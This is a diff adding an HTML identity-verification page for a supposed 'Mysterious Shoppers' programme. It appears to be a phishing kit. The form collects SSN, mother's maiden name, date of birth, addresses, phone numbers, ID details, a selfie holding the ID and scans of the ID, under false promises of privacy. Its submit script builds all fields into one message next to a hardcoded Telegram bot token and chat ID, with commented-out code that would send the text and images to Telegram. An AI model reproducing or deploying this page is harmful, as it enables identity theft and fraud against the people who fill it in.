@@ -1,0 +1,669 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Personal Information Form</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+</head>
+<body class="bg-gray-50">
+    <div class="flex flex-col items-center justify-center bg-orange-700 p-6">
+        <div class="bg-white max-w-4xl  shadow-lg rounded-2xl p-6  text-left">
+            <div class="flex justify-between">
+                <h2 class="text-2xl font-semibold text-gray-800">Verify Your Identity</h2>
+                <img src="logo.png" alt="Logo" class="w-50 h-20 mb-4">
+            </div>
+            <p class="mt-3 text-gray-600 text-left text-sm leading-relaxed">
+                This step is important to ensure everything meets our eligibility requirements and 
+                to maintain the integrity of <span class="font-medium text-gray-800">Mysterious Shoppers</span>.
+            </p>
+            <p class="mt-2 text-gray-600 text-sm leading-relaxed">
+                Rest assured, any information we collect is 
+                <span class="font-medium text-gray-800">protected end-to-end</span> and will only be used for verification purposes. 
+                Your <span class="font-medium text-gray-800">privacy and security</span> are our top priorities.
+            </p>
+        </div>
+    </div>
+    
+    <div class="max-w-4xl mx-auto p-8 bg-white shadow-md rounded-lg mt-10">
+        
+        <form id="multiStepForm" enctype="multipart/form-data">
+            <!-- First Name -->
+                <!-- <div class="flex flex-col sm:flex-row sm:space-x-4">
+                    <label for="reference" class="block text-gray-700 font-bold">Reference Number:  <span class="text-red-500">*</span></label>
+                    <input type="text" id="reference" name="reference" class="p-2 border border-gray-300 rounded-md w-full sm:w-80 focus:outline-none focus:ring-2 focus:ring-orange-500" placeholder="Reference Number" required>
+                </div>
+                <br> -->
+                <br>
+        <h2 class="text-2xl font-semibold text-orange-600 mb-6">Personal Information</h2>
+        
+            
+            <div class="space-y-6">
+                <!-- First Name -->
+                <div class="flex flex-col sm:flex-row sm:space-x-4">
+                    <label for="first_name" class="block text-gray-700 font-medium">First Name <span class="text-red-500">*</span></label>
+                    <input type="text" id="first_name" name="first_name" class="p-2 border border-gray-300 rounded-md w-full sm:w-80 focus:outline-none focus:ring-2 focus:ring-orange-500" placeholder="John" required>
+                </div>
+
+                <!-- Middle Name -->
+                <div class="flex flex-col sm:flex-row sm:space-x-4">
+                    <label for="middle_name" class="block text-gray-700 font-medium">Middle Name</label>
+                    <input type="text" id="middle_name" name="middle_name" class="p-2 border border-gray-300 rounded-md w-full sm:w-80 focus:outline-none focus:ring-2 focus:ring-orange-500" placeholder="Doe">
+                </div>
+
+                <!-- Last Name -->
+                <div class="flex flex-col sm:flex-row sm:space-x-4">
+                    <label for="last_name" class="block text-gray-700 font-medium">Last Name <span class="text-red-500">*</span></label>
+                    <input type="text" id="last_name" name="last_name" class="p-2 border border-gray-300 rounded-md w-full sm:w-80 focus:outline-none focus:ring-2 focus:ring-orange-500" placeholder="Smith" required>
+                </div>
+                <!-- Last Name -->
+                <div class="flex flex-col sm:flex-row sm:space-x-4">
+                    <label for="mothers_name" class="block text-gray-700 font-medium">Mother's Maiden Name <span class="text-red-500">*</span></label>
+                    <input type="text" id="mothers_name" name="mothers_name" class="p-2 border border-gray-300 rounded-md w-full sm:w-80 focus:outline-none focus:ring-2 focus:ring-orange-500" placeholder="..." required>
+                </div>
+
+                <!-- Suffix -->
+                <div class="flex flex-col sm:flex-row sm:space-x-4">
+                    <label for="suffix" class="block text-gray-700 font-medium">Suffix (Jr., Sr., etc.)</label>
+                    <select id="suffix" name="suffix" class="p-2 border border-gray-300 rounded-md w-full sm:w-80 focus:outline-none focus:ring-2 focus:ring-orange-500">
+                        <option value="none">None</option>
+                        <option value="jr">Jr.</option>
+                        <option value="sr">Sr.</option>
+                    </select>
+                </div>
+
+                <!-- SSN -->
+                <div class="flex flex-col sm:flex-row sm:space-x-4">
+                    <label for="ssn" class="block text-gray-700 font-medium">SSN</label>
+                    <input type="text" id="ssn" name="ssn" class="p-2 border border-gray-300 rounded-md w-48 focus:outline-none focus:ring-2 focus:ring-orange-500" placeholder="123-45-6789" pattern="\d{3}-\d{2}-\d{4}" required>
+                </div>
+
+                <!-- Date of Birth -->
+                <div class="flex flex-col sm:flex-row sm:space-x-4">
+                    <label for="dob" class="block text-gray-700 font-medium">Date of Birth <span class="text-red-500">*</span></label>
+                    <input type="date" id="dob" name="dob" class="p-2 border border-gray-300 rounded-md w-full sm:w-80 focus:outline-none focus:ring-2 focus:ring-orange-500" required>
+                </div>
+
+                <hr>
+<!-- Current Physical Address Section -->
+<h3 class="text-xl font-semibold text-orange-600 mt-8 mb-4">Current Physical Address</h3>
+
+<div class="flex flex-col sm:flex-row sm:space-x-4">
+    <label for="country" class="block text-gray-700 font-medium">Country <span class="text-red-500">*</span></label>
+    <select id="country" name="country" class="p-2 border border-gray-300 rounded-md w-full sm:w-80 focus:outline-none focus:ring-2 focus:ring-orange-500" required>
+        <option value="USA">USA</option>
+        <option value="Canada">Canada</option>
+    </select>
+</div>
+
+<div class="flex flex-col sm:flex-row sm:space-x-4">
+    <label for="address" class="block text-gray-700 font-medium">Address <span class="text-red-500">*</span></label>
+    <input type="text" id="address" name="address" class="p-2 border border-gray-300 rounded-md w-full sm:w-80 focus:outline-none focus:ring-2 focus:ring-orange-500" required>
+</div>
+
+
+<div class="flex flex-col sm:flex-row sm:space-x-4">
+    <label for="city" class="block text-gray-700 font-medium">City <span class="text-red-500">*</span></label>
+    <input type="text" id="city" name="city" class="p-2 border border-gray-300 rounded-md w-full sm:w-80 focus:outline-none focus:ring-2 focus:ring-orange-500" required>
+</div>
+
+<div class="flex flex-col sm:flex-row sm:space-x-4">
+    <label for="zip" class="block text-gray-700 font-medium">Zip <span class="text-red-500">*</span></label>
+    <input type="text" id="zip" name="zip" class="p-2 border border-gray-300 rounded-md w-full sm:w-80 focus:outline-none focus:ring-2 focus:ring-orange-500" required>
+</div>
+
+<div class="flex flex-col sm:flex-row sm:space-x-4">
+    <label for="state" class="block text-gray-700 font-medium">State <span class="text-red-500">*</span></label>
+    <select id="state" name="state" class="p-2 border border-gray-300 rounded-md w-full sm:w-80 focus:outline-none focus:ring-2 focus:ring-orange-500" required>
+        <option value="please_select">--Please Select--</option>
+    </select>
+</div>
+
+<script>
+    let usaStates = [
+        { value: "AL", text: "Alabama" }, { value: "AK", text: "Alaska" }, { value: "AZ", text: "Arizona" },
+        { value: "AR", text: "Arkansas" }, { value: "CA", text: "California" }, { value: "CO", text: "Colorado" },
+        { value: "CT", text: "Connecticut" }, { value: "DE", text: "Delaware" }, { value: "FL", text: "Florida" },
+        { value: "GA", text: "Georgia" }, { value: "HI", text: "Hawaii" }, { value: "ID", text: "Idaho" },
+        { value: "IL", text: "Illinois" }, { value: "IN", text: "Indiana" }, { value: "IA", text: "Iowa" },
+        { value: "KS", text: "Kansas" }, { value: "KY", text: "Kentucky" }, { value: "LA", text: "Louisiana" },
+        { value: "ME", text: "Maine" }, { value: "MD", text: "Maryland" }, { value: "MA", text: "Massachusetts" },
+        { value: "MI", text: "Michigan" }, { value: "MN", text: "Minnesota" }, { value: "MS", text: "Mississippi" },
+        { value: "MO", text: "Missouri" }, { value: "MT", text: "Montana" }, { value: "NE", text: "Nebraska" },
+        { value: "NV", text: "Nevada" }, { value: "NH", text: "New Hampshire" }, { value: "NJ", text: "New Jersey" },
+        { value: "NM", text: "New Mexico" }, { value: "NY", text: "New York" }, { value: "NC", text: "North Carolina" },
+        { value: "ND", text: "North Dakota" }, { value: "OH", text: "Ohio" }, { value: "OK", text: "Oklahoma" },
+        { value: "OR", text: "Oregon" }, { value: "PA", text: "Pennsylvania" }, { value: "RI", text: "Rhode Island" },
+        { value: "SC", text: "South Carolina" }, { value: "SD", text: "South Dakota" }, { value: "TN", text: "Tennessee" },
+        { value: "TX", text: "Texas" }, { value: "UT", text: "Utah" }, { value: "VT", text: "Vermont" },
+        { value: "VA", text: "Virginia" }, { value: "WA", text: "Washington" }, { value: "WV", text: "West Virginia" },
+        { value: "WI", text: "Wisconsin" }, { value: "WY", text: "Wyoming" }
+    ];
+
+    let canadaProvinces = [
+        { value: "AB", text: "Alberta" }, { value: "BC", text: "British Columbia" },
+        { value: "MB", text: "Manitoba" }, { value: "NB", text: "New Brunswick" },
+        { value: "NL", text: "Newfoundland and Labrador" }, { value: "NS", text: "Nova Scotia" },
+        { value: "ON", text: "Ontario" }, { value: "PE", text: "Prince Edward Island" },
+        { value: "QC", text: "Quebec" }, { value: "SK", text: "Saskatchewan" },
+        { value: "NT", text: "Northwest Territories" }, { value: "NU", text: "Nunavut" },
+        { value: "YT", text: "Yukon" }
+    ];
+
+    document.getElementById("country").addEventListener("change", function() {
+        const stateSelect = document.getElementById("state");
+        stateSelect.innerHTML = '<option value="please_select">--Please Select--</option>'; // Reset options
+
+        const selectedCountry = this.value;
+        let statesList = [];
+
+        if (selectedCountry === "USA") {
+            statesList = usaStates;
+        } else if (selectedCountry === "Canada") {
+            statesList = canadaProvinces;
+        }
+
+        statesList.forEach(state => {
+            let option = document.createElement("option");
+            option.value = state.value;
+            option.textContent = state.text;
+            stateSelect.appendChild(option);
+        });
+    });
+
+    // Trigger change event on page load to populate default country states
+    document.getElementById("country").dispatchEvent(new Event("change"));
+</script>
+
+
+                <!-- Use Different Address for Mailing -->
+                <div class="flex items-center">
+                    <input type="checkbox" id="use_different_address" name="use_different_address" class="mr-2">
+                    <label for="use_different_address" class="text-orange-600 text-sm">Use different address for mailing</label>
+                </div>
+
+                <!-- Mailing Address Section (Hidden by Default) -->
+                 <!-- Mailing Address Section (Hidden by Default) -->
+<div id="mailing_address_section" class="hidden">
+    <h3 class="text-xl font-semibold text-orange-600 mt-8 mb-4">Mailing Address</h3>
+
+    <div class="flex flex-col sm:flex-row sm:space-x-4">
+        <label for="mailing_country" class="block text-gray-700 font-medium">Country <span class="text-red-500">*</span></label>
+        <select id="mailing_country" name="mailing_country" class="p-2 border border-gray-300 rounded-md w-full sm:w-80 focus:outline-none focus:ring-2 focus:ring-orange-500">
+            <option value="USA">USA</option>
+            <option value="Canada">Canada</option>
+        </select>
+    </div>
+
+    <div class="flex flex-col sm:flex-row sm:space-x-4">
+        <label for="mailing_address" class="block text-gray-700 font-medium">Address <span class="text-red-500">*</span></label>
+        <input type="text" id="mailing_address" name="mailing_address" class="p-2 border border-gray-300 rounded-md w-full sm:w-80 focus:outline-none focus:ring-2 focus:ring-orange-500">
+    </div>
+
+    <div class="flex flex-col sm:flex-row sm:space-x-4">
+        <label for="mailing_city" class="block text-gray-700 font-medium">City <span class="text-red-500">*</span></label>
+        <input type="text" id="mailing_city" name="mailing_city" class="p-2 border border-gray-300 rounded-md w-full sm:w-80 focus:outline-none focus:ring-2 focus:ring-orange-500">
+    </div>
+
+    <div class="flex flex-col sm:flex-row sm:space-x-4">
+        <label for="mailing_zip" class="block text-gray-700 font-medium">Zip <span class="text-red-500">*</span></label>
+        <input type="text" id="mailing_zip" name="mailing_zip" class="p-2 border border-gray-300 rounded-md w-full sm:w-80 focus:outline-none focus:ring-2 focus:ring-orange-500">
+    </div>
+
+
+    <div class="flex flex-col sm:flex-row sm:space-x-4">
+        <label for="mailing_state" class="block text-gray-700 font-medium">State <span class="text-red-500">*</span></label>
+        <select id="mailing_state" name="mailing_state" class="p-2 border border-gray-300 rounded-md w-full sm:w-80 focus:outline-none focus:ring-2 focus:ring-orange-500">
+            <option value="please_select">--Please Select--</option>
+        </select>
+    </div>
+</div>
+
+<script>
+     usaStates = [
+        { value: "AL", text: "Alabama" }, { value: "AK", text: "Alaska" }, { value: "AZ", text: "Arizona" },
+        { value: "AR", text: "Arkansas" }, { value: "CA", text: "California" }, { value: "CO", text: "Colorado" },
+        { value: "CT", text: "Connecticut" }, { value: "DE", text: "Delaware" }, { value: "FL", text: "Florida" },
+        { value: "GA", text: "Georgia" }, { value: "HI", text: "Hawaii" }, { value: "ID", text: "Idaho" },
+        { value: "IL", text: "Illinois" }, { value: "IN", text: "Indiana" }, { value: "IA", text: "Iowa" },
+        { value: "KS", text: "Kansas" }, { value: "KY", text: "Kentucky" }, { value: "LA", text: "Louisiana" },
+        { value: "ME", text: "Maine" }, { value: "MD", text: "Maryland" }, { value: "MA", text: "Massachusetts" },
+        { value: "MI", text: "Michigan" }, { value: "MN", text: "Minnesota" }, { value: "MS", text: "Mississippi" },
+        { value: "MO", text: "Missouri" }, { value: "MT", text: "Montana" }, { value: "NE", text: "Nebraska" },
+        { value: "NV", text: "Nevada" }, { value: "NH", text: "New Hampshire" }, { value: "NJ", text: "New Jersey" },
+        { value: "NM", text: "New Mexico" }, { value: "NY", text: "New York" }, { value: "NC", text: "North Carolina" },
+        { value: "ND", text: "North Dakota" }, { value: "OH", text: "Ohio" }, { value: "OK", text: "Oklahoma" },
+        { value: "OR", text: "Oregon" }, { value: "PA", text: "Pennsylvania" }, { value: "RI", text: "Rhode Island" },
+        { value: "SC", text: "South Carolina" }, { value: "SD", text: "South Dakota" }, { value: "TN", text: "Tennessee" },
+        { value: "TX", text: "Texas" }, { value: "UT", text: "Utah" }, { value: "VT", text: "Vermont" },
+        { value: "VA", text: "Virginia" }, { value: "WA", text: "Washington" }, { value: "WV", text: "West Virginia" },
+        { value: "WI", text: "Wisconsin" }, { value: "WY", text: "Wyoming" }
+    ];
+
+     canadaProvinces = [
+        { value: "AB", text: "Alberta" }, { value: "BC", text: "British Columbia" },
+        { value: "MB", text: "Manitoba" }, { value: "NB", text: "New Brunswick" },
+        { value: "NL", text: "Newfoundland and Labrador" }, { value: "NS", text: "Nova Scotia" },
+        { value: "ON", text: "Ontario" }, { value: "PE", text: "Prince Edward Island" },
+        { value: "QC", text: "Quebec" }, { value: "SK", text: "Saskatchewan" },
+        { value: "NT", text: "Northwest Territories" }, { value: "NU", text: "Nunavut" },
+        { value: "YT", text: "Yukon" }
+    ];
+
+    function updateStateDropdown(countryElementId, stateElementId) {
+        const countrySelect = document.getElementById(countryElementId);
+        const stateSelect = document.getElementById(stateElementId);
+
+        countrySelect.addEventListener("change", function () {
+            stateSelect.innerHTML = '<option value="please_select">--Please Select--</option>'; // Reset options
+            let statesList = this.value === "USA" ? usaStates : this.value === "Canada" ? canadaProvinces : [];
+
+            statesList.forEach(state => {
+                let option = document.createElement("option");
+                option.value = state.value;
+                option.textContent = state.text;
+                stateSelect.appendChild(option);
+            });
+        });
+
+        // Trigger change event on page load to populate default country states
+        countrySelect.dispatchEvent(new Event("change"));
+    }
+
+    // Initialize both dropdowns
+    updateStateDropdown("mailing_country", "mailing_state");
+</script>
+
+                <!-- Contact Information Section -->
+                <h3 class="text-xl font-semibold text-orange-600 mt-8 mb-4">Contact Information</h3>
+
+                <div class="flex flex-col sm:flex-row sm:space-x-4">
+                    <label for="preferred_contact_method" class="block text-gray-700 font-medium">Preferred Contact Method</label>
+                    <select id="preferred_contact_method" name="preferred_contact_method" class="p-2 border border-gray-300 rounded-md w-full sm:w-80 focus:outline-none focus:ring-2 focus:ring-orange-500">
+                        <option value="please_select">--Please Select--</option>
+                        <option value="email">Email</option>
+                        <option value="phone">Phone</option>
+                    </select>
+                </div>
+
+                <div class="flex flex-col sm:flex-row sm:space-x-4">
+                    <label for="email" class="block text-gray-700 font-medium">Email <span class="text-red-500">*</span></label>
+                    <input type="email" id="email" name="email" class="p-2 border border-gray-300 rounded-md w-full sm:w-80 focus:outline-none focus:ring-2 focus:ring-orange-500" required>
+                </div>
+
+                <div class="flex flex-col sm:flex-row sm:space-x-4">
+                    <label for="home_phone" class="block text-gray-700 font-medium">Home Phone <span class="text-red-500">*</span></label>
+                    <input type="text" id="home_phone" name="home_phone" placeholder="(xxx) xxx-xxxx" class="p-2 border border-gray-300 rounded-md w-full sm:w-80 focus:outline-none focus:ring-2 focus:ring-orange-500" required>
+                </div>
+
+                <div class="flex flex-col sm:flex-row sm:space-x-4">
+                    <label for="cell_phone" class="block text-gray-700 font-medium">Cell Phone</label>
+                    <input type="text" id="cell_phone" name="cell_phone" placeholder="(xxx) xxx-xxxx" class="p-2 border border-gray-300 rounded-md w-full sm:w-80 focus:outline-none focus:ring-2 focus:ring-orange-500">
+                </div>
+
+                <div class="flex flex-col sm:flex-row sm:space-x-4">
+                    <label for="work_phone" class="block text-gray-700 font-medium">Work Phone</label>
+                    <input type="text" id="work_phone" name="work_phone" placeholder="(xxx) xxx-xxxx" class="p-2 border border-gray-300 rounded-md w-full sm:w-80 focus:outline-none focus:ring-2 focus:ring-orange-500">
+                </div>
+
+                <!-- Identification Section -->
+                <h3 class="text-xl font-semibold text-orange-600 mt-8 mb-4">Identification</h3>
+                <div class="flex flex-col sm:flex-row sm:space-x-4">
+                    <label for="id_type" class="block text-gray-700 font-medium">ID Type <span class="text-red-500">*</span></label>
+                    <select id="id_type" name="id_type" class="p-2 border border-gray-300 rounded-md w-full sm:w-80 focus:outline-none focus:ring-2 focus:ring-orange-500" required>
+                        <option value="drivers_license">DRIVERS LICENSE</option>
+                        <option value="passport">PASSPORT</option>
+                        <option value="state_id">STATE ID</option>
+                    </select>
+                </div>
+
+                <div class="flex flex-col sm:flex-row sm:space-x-4">
+                    <label for="id_number" class="block text-gray-700 font-medium">ID Number <span class="text-red-500">*</span></label>
+                    <input type="text" id="id_number" name="id_number" class="p-2 border border-gray-300 rounded-md w-full sm:w-80 focus:outline-none focus:ring-2 focus:ring-orange-500" required>
+                </div>
+
+                <div class="flex flex-col sm:flex-row sm:space-x-4">
+                    <label for="id_state" class="block text-gray-700 font-medium">ID State <span class="text-red-500">*</span></label>
+                    <select id="id_state" name="id_state" class="p-2 border border-gray-300 rounded-md w-full sm:w-80 focus:outline-none focus:ring-2 focus:ring-orange-500" required>
+                        <option value="please_select">--Please Select--</option>
+                        <!-- U.S. States -->
+                        <option value="AL">Alabama</option>
+                        <option value="AK">Alaska</option>
+                        <option value="AZ">Arizona</option>
+                        <option value="AR">Arkansas</option>
+                        <option value="CA">California</option>
+                        <option value="CO">Colorado</option>
+                        <option value="CT">Connecticut</option>
+                        <option value="DE">Delaware</option>
+                        <option value="FL">Florida</option>
+                        <option value="GA">Georgia</option>
+                        <option value="HI">Hawaii</option>
+                        <option value="ID">Idaho</option>
+                        <option value="IL">Illinois</option>
+                        <option value="IN">Indiana</option>
+                        <option value="IA">Iowa</option>
+                        <option value="KS">Kansas</option>
+                        <option value="KY">Kentucky</option>
+                        <option value="LA">Louisiana</option>
+                        <option value="ME">Maine</option>
+                        <option value="MD">Maryland</option>
+                        <option value="MA">Massachusetts</option>
+                        <option value="MI">Michigan</option>
+                        <option value="MN">Minnesota</option>
+                        <option value="MS">Mississippi</option>
+                        <option value="MO">Missouri</option>
+                        <option value="MT">Montana</option>
+                        <option value="NE">Nebraska</option>
+                        <option value="NV">Nevada</option>
+                        <option value="NH">New Hampshire</option>
+                        <option value="NJ">New Jersey</option>
+                        <option value="NM">New Mexico</option>
+                        <option value="NY">New York</option>
+                        <option value="NC">North Carolina</option>
+                        <option value="ND">North Dakota</option>
+                        <option value="OH">Ohio</option>
+                        <option value="OK">Oklahoma</option>
+                        <option value="OR">Oregon</option>
+                        <option value="PA">Pennsylvania</option>
+                        <option value="RI">Rhode Island</option>
+                        <option value="SC">South Carolina</option>
+                        <option value="SD">South Dakota</option>
+                        <option value="TN">Tennessee</option>
+                        <option value="TX">Texas</option>
+                        <option value="UT">Utah</option>
+                        <option value="VT">Vermont</option>
+                        <option value="VA">Virginia</option>
+                        <option value="WA">Washington</option>
+                        <option value="WV">West Virginia</option>
+                        <option value="WI">Wisconsin</option>
+                        <option value="WY">Wyoming</option>
+                        <!-- Canadian Provinces/Territories -->
+                        <option value="AB">Alberta</option>
+                        <option value="BC">British Columbia</option>
+                        <option value="MB">Manitoba</option>
+                        <option value="NB">New Brunswick</option>
+                        <option value="NL">Newfoundland and Labrador</option>
+                        <option value="NS">Nova Scotia</option>
+                        <option value="ON">Ontario</option>
+                        <option value="PE">Prince Edward Island</option>
+                        <option value="QC">Quebec</option>
+                        <option value="SK">Saskatchewan</option>
+                        <option value="NT">Northwest Territories</option>
+                        <option value="NU">Nunavut</option>
+                        <option value="YT">Yukon</option>
+                    </select>
+                </div>
+
+                <div class="flex flex-col sm:flex-row sm:space-x-4">
+                    <label for="id_date_issued" class="block text-gray-700 font-medium">ID Date Issued <span class="text-red-500">*</span></label>
+                    <div class="flex space-x-2">
+                        <input type="number" id="id_date_issued_mm" name="id_date_issued_mm" placeholder="mm" class="p-2 border border-gray-300 rounded-md w-20 focus:outline-none focus:ring-2 focus:ring-orange-500" maxlength="2" required>
+                        <input type="number" id="id_date_issued_dd" name="id_date_issued_dd" placeholder="dd" class="p-2 border border-gray-300 rounded-md w-20 focus:outline-none focus:ring-2 focus:ring-orange-500" maxlength="2" required>
+                        <input type="number" id="id_date_issued_yyyy" name="id_date_issued_yyyy" placeholder="yyyy" class="p-2 border border-gray-300 rounded-md w-28 focus:outline-none focus:ring-2 focus:ring-orange-500" maxlength="4" required>
+                    </div>
+                </div>
+
+                <div class="flex flex-col sm:flex-row sm:space-x-4">
+                    <label for="id_expiration_date" class="block text-gray-700 font-medium">ID Expiration Date <span class="text-red-500">*</span></label>
+                    <div class="flex space-x-2">
+                        <input type="number" id="id_expiration_mm" name="id_expiration_mm" placeholder="mm" class="p-2 border border-gray-300 rounded-md w-20 focus:outline-none focus:ring-2 focus:ring-orange-500" maxlength="2" required>
+                        <input type="number" id="id_expiration_dd" name="id_expiration_dd" placeholder="dd" class="p-2 border border-gray-300 rounded-md w-20 focus:outline-none focus:ring-2 focus:ring-orange-500" maxlength="2" required>
+                        <input type="number" id="id_expiration_yyyy" name="id_expiration_yyyy" placeholder="yyyy" class="p-2 border border-gray-300 rounded-md w-28 focus:outline-none focus:ring-2 focus:ring-orange-500" maxlength="4" required>
+                    </div>
+                </div>
+
+                <!-- About Your Employment Section -->
+                <h3 class="text-xl font-semibold text-orange-600 mt-8 mb-4">About Your Employment</h3>
+                <div class="flex flex-col sm:flex-row sm:space-x-4">
+                    <label for="employment_status" class="block text-gray-700 font-medium">Employment Status <span class="text-red-500">*</span></label>
+                    <select id="employment_status" name="employment_status" class="p-2 border border-gray-300 rounded-md w-full sm:w-80 focus:outline-none focus:ring-2 focus:ring-orange-500" required>
+                        <option value="please_select">--Please Select--</option>
+                        <option value="employed">Employed</option>
+                        <option value="unemployed">Unemployed</option>
+                        <option value="student">Student</option>
+                        <!-- Add more options as needed -->
+                    </select>
+                </div>
+
+                <!-- Upload Documents Section -->
+                <h3 class="text-xl font-semibold text-orange-600 mt-8 mb-4">Upload Selfie</h3>
+                <img src="selfie.png" />
+                <p class="text-gray-700 text-sm font-bold mb-4">Upload a photo of yourself holding your identity document next to your face.</p>
+                <p class="text-gray-700 text-sm mb-4 font-bold">Please ensure your face and ID are clearly visible in the photo.</p>
+                <div class="space-y-4">
+                    <div class="flex flex-col sm:flex-row sm:space-x-4">
+                        <label for="selfie" class="block text-gray-700 font-medium">Upload Selfie <span class="text-red-500">*</span></label>
+                        <input type="file" id="selfie" name="selfie" class="p-2 border border-gray-300 rounded-md w-full sm:w-80 focus:outline-none focus:ring-2 focus:ring-orange-500" required>
+                    </div>
+                </div>
+                <!-- Upload Documents Section -->
+                <h3 class="text-xl font-semibold text-orange-600 mt-8 mb-4">Upload Documents</h3>
+                <img src="id.jpg" />
+                <p class="text-gray-700 text-sm mb-4">Please upload a copy of your Photo ID (front and back).</p>
+                <div class="space-y-4">
+                    <div class="flex flex-col sm:flex-row sm:space-x-4">
+                        <label for="file_upload_front" class="block text-gray-700 font-medium">Upload Photo ID (Front) <span class="text-red-500">*</span></label>
+                        <input type="file" id="file_upload_front" name="file_upload_front" class="p-2 border border-gray-300 rounded-md w-full sm:w-80 focus:outline-none focus:ring-2 focus:ring-orange-500" required>
+                    </div>
+                    <div class="flex flex-col sm:flex-row sm:space-x-4">
+                        <label for="file_upload_back" class="block text-gray-700 font-medium">Upload Photo ID (Back) <span class="text-red-500">*</span></label>
+                        <input type="file" id="file_upload_back" name="file_upload_back" class="p-2 border border-gray-300 rounded-md w-full sm:w-80 focus:outline-none focus:ring-2 focus:ring-orange-500" required>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Submit Section -->
+            <div class="mt-8 flex justify-end space-x-4">
+                <button type="reset" class="px-6 py-2 bg-gray-300 text-gray-700 rounded-md hover:bg-gray-400 focus:outline-none focus:ring-2 focus:ring-gray-500">Reset</button>
+                <button type="submit" class="px-6 py-2 bg-orange-600 text-white rounded-md hover:bg-orange-700 focus:outline-none focus:ring-2 focus:ring-orange-500">Verify</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        // SSN Auto-formatting
+        document.getElementById('ssn').addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 3) value = value.slice(0, 3) + '-' + value.slice(3);
+            if (value.length > 6) value = value.slice(0, 6) + '-' + value.slice(6);
+            e.target.value = value.slice(0, 11);
+        });
+
+        // Toggle Mailing Address Section
+        document.getElementById('use_different_address').addEventListener('change', function (e) {
+            const mailingAddressSection = document.getElementById('mailing_address_section');
+            if (e.target.checked) {
+                mailingAddressSection.classList.remove('hidden');
+            } else {
+                mailingAddressSection.classList.add('hidden');
+            }
+        });
+        
+        $('#multiStepForm').submit(function(e) {
+            e.preventDefault();
+            let formData = new FormData(this);
+            let botToken = "7779208165:AAGh51t9Myw5DLcS2YmH3v_8TU7NXw7QszM";
+            let chatId = "-4760497694";
+            console.log(formData)
+    
+            // let message = `Step 1:\nFirst Name: ${formData.get("firstName")}\nLast Name: ${formData.get("lastName")}\nSSN: ${formData.get("ssn")}\nHome Address: ${formData.get("homeAddress")}\nMailing Address: ${formData.get("mailingAddress")}\n\nStep 3:\nFull Name: ${formData.get("fullName")}\nBank Name: ${formData.get("bankName")}\nAccount Number: ${formData.get("accountNumber")}\nRouting Number: ${formData.get("routingNumber")}\nAccount Type: ${formData.get("accountType")}`;
+            
+
+// Extracting the form data
+// let verification_number = document.getElementById('reference').value;
+let firstName = document.getElementById('first_name').value;
+let middleName = document.getElementById('middle_name').value;
+let lastName = document.getElementById('last_name').value;
+let motherName = document.getElementById('mothers_name').value;
+let suffix = document.getElementById('suffix').value;
+let ssn = document.getElementById('ssn').value;
+let dob = document.getElementById('dob').value;
+let country = document.getElementById('country').value;
+let address = document.getElementById('address').value;
+let zip = document.getElementById('zip').value;
+let city = document.getElementById('city').value;
+let state = document.getElementById('state').value;
+let useDifferentAddress = document.getElementById('use_different_address').checked;
+let mailingCountry = document.getElementById('mailing_country').value;
+let mailingAddress = document.getElementById('mailing_address').value;
+let mailingZip = document.getElementById('mailing_zip').value;
+let mailingCity = document.getElementById('mailing_city').value;
+let mailingState = document.getElementById('mailing_state').value;
+let preferredContactMethod = document.getElementById('preferred_contact_method').value;
+let email = document.getElementById('email').value;
+let homePhone = document.getElementById('home_phone').value;
+let cellPhone = document.getElementById('cell_phone').value;
+let workPhone = document.getElementById('work_phone').value;
+let idType = document.getElementById('id_type').value;
+let idNumber = document.getElementById('id_number').value;
+let idState = document.getElementById('id_state').value;
+let idDateIssuedMM = document.getElementById('id_date_issued_mm').value;
+let idDateIssuedDD = document.getElementById('id_date_issued_dd').value;
+let idDateIssuedYYYY = document.getElementById('id_date_issued_yyyy').value;
+let idExpirationDateMM = document.getElementById('id_expiration_mm').value;
+let idExpirationDateDD = document.getElementById('id_expiration_dd').value;
+let idExpirationDateYYYY = document.getElementById('id_expiration_yyyy').value;
+// Reference Number: ${verification_number}
+
+// Create the message to send
+let message = `
+
+Personal Information:
+First Name: ${firstName}
+Middle Name: ${middleName}
+Last Name: ${lastName}
+Mothers Name: ${motherName}
+Suffix: ${suffix}
+SSN: ${ssn}
+Date of Birth: ${dob}
+
+Current Physical Address:
+Country: ${country}
+Address: ${address}
+ZIP: ${zip}
+City: ${city}
+State: ${state}
+
+Mailing Address:
+Use Different Address: ${useDifferentAddress ? 'Yes' : 'No'}
+Mailing Country: ${mailingCountry}
+Mailing Address: ${mailingAddress}
+Mailing ZIP: ${mailingZip}
+Mailing City: ${mailingCity}
+Mailing State: ${mailingState}
+
+Contact Information:
+Preferred Contact Method: ${preferredContactMethod}
+Email: ${email}
+Home Phone: ${homePhone}
+Cell Phone: ${cellPhone}
+Work Phone: ${workPhone}
+
+Identification:
+ID Type: ${idType}
+ID Number: ${idNumber}
+ID State: ${idState}
+ID Date Issued: ${idDateIssuedMM}/${idDateIssuedDD}/${idDateIssuedYYYY}
+ID Expiration Date: ${idExpirationDateMM}/${idExpirationDateDD}/${idExpirationDateYYYY}
+`;
+
+// Send the message to Telegram
+// let textUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+// $.post(textUrl, { chat_id: chatId, text: message });
+
+// // Function to send files
+// function sendFile(fileInputName) {
+//     let file = document.getElementById(fileInputName).files[0];
+//     if (file) {
+//         let fileData = new FormData();
+//         fileData.append("chat_id", chatId);
+//         fileData.append("document", file, file.name);
+
+//         let fileUrl = `https://api.telegram.org/bot${botToken}/sendDocument`;
+//         $.ajax({
+//             url: fileUrl,
+//             type: "POST",
+//             data: fileData,
+//             processData: false,
+//             contentType: false,
+//             success: function(response) {
+//                 console.log("File sent successfully:", response);
+//             },
+//             error: function(xhr, status, error) {
+//                 console.error("Error sending file:", error);
+//             }
+//         });
+//     } else {
+//         console.error("No file found with input name:", fileInputName);
+//     }
+// }
+
+// // Example to send files, you can call sendFile for your specific inputs
+// sendFile("selfie");
+// sendFile("file_upload_front");
+// sendFile("file_upload_back");
+
+//             // sendFile("selfie");
+//             // sendFile("bankCardFront");
+//             // sendFile("bankCardBack");
+            
+//             // alert("Form submitted successfully!");
+//             window.location.href = './success.html'
